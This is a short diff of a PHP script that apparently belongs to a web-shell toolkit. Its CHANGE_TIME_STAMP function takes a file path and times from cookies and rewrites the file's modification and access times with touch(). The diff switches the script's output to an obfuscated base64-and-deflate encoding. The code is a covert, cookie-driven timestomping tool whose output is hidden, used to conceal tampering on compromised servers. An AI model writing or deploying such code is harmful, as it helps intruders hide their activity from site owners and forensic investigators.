@@ -79,6 +79,8 @@ $arguments = [
     "mtime" => isset($_COOKIE["mtime"]) ? (int)$_COOKIE["mtime"] : 946684800      // Modification time
 ];
 
+
+
 function CHANGE_TIME_STAMP()
 {
     global $arguments, $start;
@@ -88,7 +90,7 @@ function CHANGE_TIME_STAMP()
 
     if (file_exists($path))
     {
-        if (!touch($path, strtotime($mtime), strtotime($atime)))    //  FORMAT: [Day Month Year Hours:Minutes:Seconds AM/PM ] i.e 14 Aug 2100 09:33:15 AM
+        if (!touch($path, $mtime, $atime))
         {
             @array_push($debug, ['error' => 'unable to touch `'.$path.'`']);
         }
@@ -109,8 +111,8 @@ function CHANGE_TIME_STAMP()
         'data' => $data
     ], JSON_UNESCAPED_UNICODE);
 
-    // echo trim(base64_encode(gzdeflate($response, $level)), '=');
-    echo $response;
+    echo trim(base64_encode(gzdeflate($response, $level)), '=');
+    // echo $response;
 }
 
 @CHANGE_TIME_STAMP();
